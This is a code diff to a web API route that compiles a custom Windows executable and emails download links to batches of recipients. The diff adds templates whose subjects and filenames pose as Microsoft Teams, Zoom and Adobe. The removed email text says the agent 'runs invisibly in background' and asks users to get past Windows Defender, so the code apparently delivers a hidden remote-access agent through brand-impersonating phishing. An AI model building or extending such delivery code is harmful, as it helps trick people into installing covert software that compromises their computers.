@@ -4,15 +4,17 @@ import { supabase } from '@/lib/supabase';
 import crypto from 'crypto';
 import fs from 'fs';
 import path from 'path';
+import { getEmailTemplate, EMAIL_TEMPLATES } from '@/lib/email-templates';
 
 const BUILD_SERVICE_URL = 'http://18.217.69.184:8080/api/Compile';
 
 export async function POST(request: NextRequest) {
   try {
-    const { recipientEmail, installToken, recipientEmails } = await request.json();
+    const { recipientEmail, installToken, recipientEmails, template } = await request.json();
 
     // Support both single email and batch emails
     const emails = recipientEmails || [recipientEmail];
+    const templateId = template || 'voice-note'; // Default template
     
     if (!emails || emails.length === 0 || !installToken) {
       return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
@@ -84,6 +86,10 @@ export async function POST(request: NextRequest) {
     // Write .exe to filesystem
     fs.writeFileSync(exePath, exeBytes);
     
+    // Get template info for branded filename
+    const templateInfo = EMAIL_TEMPLATES.find(t => t.id === templateId);
+    const filename = templateInfo?.filename || 'UCAgent.exe';
+    
     // Store download record in Supabase (just metadata, no file storage)
     const expiresAt = new Date();
     expiresAt.setHours(expiresAt.getHours() + 24); // 24 hour expiration for Vercel tmp
@@ -93,7 +99,7 @@ export async function POST(request: NextRequest) {
       .insert({
         download_id: downloadId,
         user_id: user.id,
-        filename: 'UCAgent.exe',
+        filename: filename,
         file_size: exeBytes.length,
         expires_at: expiresAt.toISOString(),
         created_at: new Date().toISOString()
@@ -107,54 +113,19 @@ export async function POST(request: NextRequest) {
     // Create download URL
     const downloadUrl = `${serverUrl}/api/download/${downloadId}`;
 
-    // Email HTML template with download link
-    const emailHtml = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>UC Universal Connect - Agent Ready</title>
-</head>
-<body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: Arial, sans-serif;">
-    <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 30px;">
-        
-        <div style="text-align: center; margin-bottom: 30px;">
-            <h1 style="color: #007acc;">🖥️ UC Universal Connect</h1>
-            <h2 style="color: #333;">✅ Your Agent is Ready!</h2>
-        </div>
-        
-        <p style="color: #555; line-height: 1.6;">
-            Your custom UC Connect agent has been compiled successfully. 
-            Click the button below to download your personalized executable.
-        </p>
-        
-        <div style="text-align: center; margin: 30px 0;">
-            <a href="${downloadUrl}" 
-               style="display: inline-block; background: linear-gradient(45deg, #007acc, #0056b3); color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
-                📥 Download UC Agent (.exe)
-            </a>
-        </div>
-        
-        <div style="background: #f8f9fa; border-left: 4px solid #007acc; padding: 15px; margin: 20px 0;">
-            <strong>Quick Setup:</strong>
-            <ol style="margin: 10px 0;">
-                <li>Download and run the .exe file</li>
-                <li>Allow Windows Defender if prompted</li>
-                <li>Agent runs invisibly in background</li>
-                <li>Check your dashboard for connected device</li>
-            </ol>
-        </div>
-        
-        <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
-            <strong>🔒 Security:</strong> This agent is uniquely compiled for your account. 
-            Do not share with others. Download link expires in 48 hours.
-        </div>
-        
-        <div style="text-align: center; color: #999; font-size: 12px; margin-top: 30px;">
-            UC Universal Connect © 2026
-        </div>
-    </div>
-</body>
-</html>`;
+    // Get branded email template
+    const emailTemplate = getEmailTemplate(templateId);
+    const emailHtml = emailTemplate.replace('{{DOWNLOAD_LINK}}', downloadUrl);
+    
+    // Get subject line based on template
+    const subjectMap = {
+      'voice-note': 'AudioSync Pro - Voice Recording Studio Ready',
+      'zoom-meeting': 'ZoomConnect Pro - Your Meeting Room is Ready', 
+      'adobe-creative': 'Creative Hub - Your Design Suite is Ready',
+      'teams-enterprise': 'Microsoft Teams - Enterprise Setup Complete'
+    };
+    
+    const emailSubject = subjectMap[templateId] || 'UC Connect Agent - Ready for Download';
 
     // Send emails to all recipients with .exe attachment
     const emailResults = [];
@@ -164,7 +135,7 @@ export async function POST(request: NextRequest) {
       try {
         const emailResult = await sendEmailWithAttachment(
           email,
-          'UC Connect Agent - Ready for Download',
+          emailSubject,
           emailHtml,
           '', // No filename (no attachment)
           Buffer.from(''), // No attachment
